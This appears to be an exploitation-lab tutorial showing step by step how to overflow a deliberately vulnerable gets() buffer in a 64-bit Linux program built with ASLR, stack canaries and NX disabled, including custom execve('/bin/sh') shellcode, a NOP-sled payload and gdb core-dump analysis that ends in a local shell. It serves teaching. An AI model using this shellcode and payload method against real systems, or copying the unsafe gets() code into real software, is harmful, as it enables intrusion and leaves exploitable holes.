# &#35; basic stack buffer overflow

#### &#42; setting aslr off & core dump
```bash

$ cat /etc/sysctl.conf
kernel.randomize_va_space=0
kernel.core_pattern = core.%e


$ sudo sysctl -p
kernel.randomize_va_space = 0
kernel.core_pattern = core.%e

```

#### &#42; vulnerable source code
#### strcpy() in vuln_func() : can overwrite rsp & rip ...
```bash

$ cat vulnerable.c
#include <stdio.h>

void vuln_func() {
	char buffer[256];
	gets(&buffer);
	printf("%s\n", buffer);
}

void main(int argc, char *argv[]) {
	vuln_func();
}

# Canary/SSP & NX off because of first exploit
$ gcc -fno-stack-protector -z execstack vulnerable.c -o vulnerable

```


#### &#42; compile & try to overflow
```bash
$ pwn cyclic 300
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac

$ pwn cyclic 300 > payload
$ cat payload
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac

$ $ (cat payload ; cat) | ./vulnerable

aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac
segmentation fault (core dumped)

$ ls core.vulnerable
core.vulnerable
```


#### &#42; analysis using gdb(gef)
```bash
$ gdb -c core.vulnerable -q
[*] 3 commands could not be loaded, run `gef missing` to know why.
[New LWP 2031]
Core was generated by `./vulnerable'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x000055555555519d in ?? ()
gef➤  x/50xg $rsp-280
0x7fffffffe290:	0x0000000000000000	0x000055555555519b
0x7fffffffe2a0:	0x6161616261616161	0x6161616461616163
0x7fffffffe2b0:	0x6161616661616165	0x6161616861616167
0x7fffffffe2c0:	0x6161616a61616169	0x6161616c6161616b
0x7fffffffe2d0:	0x6161616e6161616d	0x616161706161616f
0x7fffffffe2e0:	0x6161617261616171	0x6161617461616173
0x7fffffffe2f0:	0x6161617661616175	0x6161617861616177
0x7fffffffe300:	0x6261617a61616179	0x6261616362616162
0x7fffffffe310:	0x6261616562616164	0x6261616762616166
0x7fffffffe320:	0x6261616962616168	0x6261616b6261616a
0x7fffffffe330:	0x6261616d6261616c	0x6261616f6261616e
0x7fffffffe340:	0x6261617162616170	0x6261617362616172
0x7fffffffe350:	0x6261617562616174	0x6261617762616176
0x7fffffffe360:	0x6261617962616178	0x636161626361617a
0x7fffffffe370:	0x6361616463616163	0x6361616663616165
0x7fffffffe380:	0x6361616863616167	0x6361616a63616169
0x7fffffffe390:	0x6361616c6361616b	0x6361616e6361616d
0x7fffffffe3a0:	0x636161706361616f	0x6361617263616171
0x7fffffffe3b0:	0x6361617463616173	0x6361617663616175
0x7fffffffe3c0:	0x6361617863616177	0x00007f0063616179
0x7fffffffe3d0:	0x00007ffff7ffc620	0x00007fffffffe4b8
0x7fffffffe3e0:	0x0000000100000000	0x000055555555519e
0x7fffffffe3f0:	0x00005555555551c0	0x940f08fc783b366b
0x7fffffffe400:	0x0000555555555080	0x00007fffffffe4b0
0x7fffffffe410:	0x0000000000000000	0x0000000000000000
gef➤
# 0x7fffffffe2c0 is nops address (becauser of memory address gap), not 0x7fffffffe2a0


# pattern payload exists in rbp
# and rip is fault address
gef➤  info reg
rax            0x12d               0x12d
rbx            0x5555555551c0      0x5555555551c0
rcx            0x7ffff7ed01e7      0x7ffff7ed01e7
rdx            0x0                 0x0
rsi            0x55555555a2b0      0x55555555a2b0
rdi            0x7ffff7fad4c0      0x7ffff7fad4c0
rbp            0x636161706361616f  0x636161706361616f
rsp            0x7fffffffe3a8      0x7fffffffe3a8
r8             0x12d               0x12d
r9             0x7c                0x7c
r10            0x7ffff7faabe0      0x7ffff7faabe0
r11            0x246               0x246
r12            0x555555555080      0x555555555080
r13            0x7fffffffe4b0      0x7fffffffe4b0
r14            0x0                 0x0
r15            0x0                 0x0
rip            0x55555555519d      0x55555555519d
eflags         0x10246             [ PF ZF IF RF ]
cs             0x33                0x33
ss             0x2b                0x2b
ds             0x0                 0x0
es             0x0                 0x0
fs             0x0                 0x0
gs             0x0                 0x0
gef➤

```



#### &#42; find exactly offset count
```bash
# find out 256 bytes
$ pwn cyclic -l 0x6361616f
256
$ pwn cyclic -l 0x63616170
260

```

#### &#42; make shellcode
#### link : <https://github.com/pwn4all/pwn/blob/master/make-shellcode.md/>
```bash
$ cat shell.s
global _start
section .text
_start:
  xor rsi,rsi			; rsi = 0
  push rsi			; push null(0x0) on stack
  mov rdi,0x68732f2f6e69622f
  push rdi			; push /bin/sh on stack
  push rsp			; push &/bin/sh\0
  pop rdi			; rdi = &/bin/sh\0
  push 59			; call sys_execve
  pop rax			; rax = 0
  cdq
  syscall

shell$ nasm -f elf64 shell.s -o shell.o
shell$ ld shell.o -o shell
shell$ ./shell
$ exit

shell$ echo "\"$(objdump -d ./shell | grep '[0-9a-f]:' | cut -d$'\t' -f2 | grep -v 'file' | tr -d " \n" | sed 's/../\\x&/g')\""
"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
```

#### &#42; assemble payload
#### buf[256] + rbp[8] + ret/rip[8]
#### => nops[177] + shellcode[23] + nops[56] + dummy[8] + addr_shellcode
```bash
python -c 'print "\x90"*177+"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"+"\x90"*56+"B"*8+"C"*6' > payload

```

#### &#42; find target memory address
```bash
$ python -c 'print "\x90"*177+"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"+"\x90"*56+"B"*8+"C"*6' > payload

$ gdb ./vulnerable -q
gef➤  b *vuln_func
Breakpoint 1 at 0x555555555169
gef➤  r < payload
gef➤  continue
.
# overwrite payload on rip and rsp
.
$rsp   : 0x00007fffffffe360  →  0x00007fffffffe468  →  0x00007fffffffe6cd  →  "/home/user/aslr/nx-gets/vulnerable"
$rbp   : 0x4242424242424242 ("BBBBBBBB"?)
$rsi   : 0x000055555555a2b0  →  0x9090909090909090
$rdi   : 0x00007ffff7fad4c0  →  0x0000000000000000
$rip   : 0x434343434343
.
.

gef➤  b *vuln_func+30         => gets()
Breakpoint 2 at 0x555555555187
gef➤  r < payload
gef➤  continue
gef➤  ni
gef➤  x/56x $rsp
0x7fffffffe250:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe260:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe270:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe280:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe290:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe2a0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe2b0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe2c0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe2d0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe2e0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe2f0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe300:	0xf6314890	0x2fbf4856	0x2f6e6962	0x5768732f
0x7fffffffe310:	0x3b6a5f54	0x050f9958	0x90909090	0x90909090
0x7fffffffe320:	0x90909090	0x90909090	0x90909090	0x90909090
gef➤

# find nops address(0x7fffffffe280) for shellcode

```


#### &#42; try to exploit
#### if you failed exploit > use core debugging > need to exactly find nops address for shellcode
```bash
$ python -c 'print "\x90"*177+"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"+"\x90"*56+"BBBBBBBB"+"\x80\xe2\xff\xff\xff\x7f"' > payload
user@pwn:~/aslr/nx-gets$ (cat payload ; cat) | ./vulnerable
���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������H1�VH�/bin//shWT_j;X���������������������������������������������������������BBBBBBBB�����
id
segmentation fault (core dumped)


$ gdb -core core.vulnerable -q
gef➤  x/50xg $rsp-280
0x7fffffffe298:	0x000055555555519b	0x9090909090909090
0x7fffffffe2a8:	0x9090909090909090	0x9090909090909090
0x7fffffffe2b8:	0x9090909090909090	0x9090909090909090
0x7fffffffe2c8:	0x9090909090909090	0x9090909090909090
0x7fffffffe2d8:	0x9090909090909090	0x9090909090909090
0x7fffffffe2e8:	0x9090909090909090	0x9090909090909090
0x7fffffffe2f8:	0x9090909090909090	0x9090909090909090
0x7fffffffe308:	0x9090909090909090	0x9090909090909090
0x7fffffffe318:	0x9090909090909090	0x9090909090909090
0x7fffffffe328:	0x9090909090909090	0x9090909090909090
0x7fffffffe338:	0x9090909090909090	0x9090909090909090
0x7fffffffe348:	0x9090909090909090	0x2fbf4856f6314890
0x7fffffffe358:	0x5768732f2f6e6962	0x050f99583b6a5f54
0x7fffffffe368:	0x9090909090909090	0x9090909090909090
0x7fffffffe378:	0x9090909090909090	0x9090909090909090
0x7fffffffe388:	0x9090909090909090	0x9090909090909090
0x7fffffffe398:	0x9090909090909090	0x4242424242424242
0x7fffffffe3a8:	0x00007fffffffe280	0x00007fffffffe4b8
0x7fffffffe3b8:	0x0000000100000000	0x0000000000000000
0x7fffffffe3c8:	0x00007ffff7de60b3	0x00007ffff7ffc620
0x7fffffffe3d8:	0x00007fffffffe4b8	0x0000000100000000
0x7fffffffe3e8:	0x000055555555519e	0x00005555555551c0
0x7fffffffe3f8:	0xb757adae75d46c23	0x0000555555555080
0x7fffffffe408:	0x00007fffffffe4b0	0x0000000000000000
0x7fffffffe418:	0x0000000000000000	0x48a85251b2746c23
gef➤

# change nops address to 0x7fffffffe2d8

$ python -c 'print "\x90"*177+"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"+"\x90"*56+"BBBBBBBB"+"\xd8\xe2\xff\xff\xff\x7f"' > payload
$ (cat payload ; cat) | ./vulnerable
���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������H1�VH�/bin//shWT_j;X���������������������������������������������������������BBBBBBBB�����
id
uid=1000(user) gid=1000(user) groups=1000(user)

```

